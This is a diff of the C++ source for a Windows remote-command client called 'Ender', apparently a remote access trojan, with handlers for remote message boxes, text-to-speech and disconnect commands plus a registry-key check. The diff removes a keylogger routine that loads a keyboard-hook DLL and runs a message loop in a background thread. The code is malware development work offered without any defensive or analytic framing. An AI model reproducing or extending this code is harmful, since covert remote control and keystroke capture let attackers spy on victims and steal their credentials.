@@ -1,8 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
-#include <Windows.h>
-#include <WS2tcpip.h>
+
 #include <sapi.h>
 #include "client.h"
 #include "main.h"
@@ -17,7 +16,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int n
 	init_winsock();
 
 	CLIENT client;
-	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)keylog_loop, NULL, NULL, NULL);
 
 	if (!client.CheckRegKey())
 	{
@@ -49,7 +47,7 @@ void handle_command(CLIENT& client, string& command)
 {
 	if(command.substr(0,5) == "show ")
 	{
-		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK);
+		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // client hangs when messagebox is displayed
 	}
 	else if(command == "disconnect")
 	{
@@ -88,17 +86,4 @@ void speak_command(string& command)
 	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
 	pVoice->Release();
 	CoUninitialize();
-}
-
-void keylog_loop()
-{
-	HMODULE keylog = LoadLibraryA("KeyLog_Module.dll");
-	SetHook SetKeyBoardHook = (SetHook)GetProcAddress(keylog, "SetKeyBoardHook");
-	SetKeyBoardHook();
-	MSG msg;
-	while(GetMessage(&msg, NULL, 0, 0) != 0)
-	{
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
 }
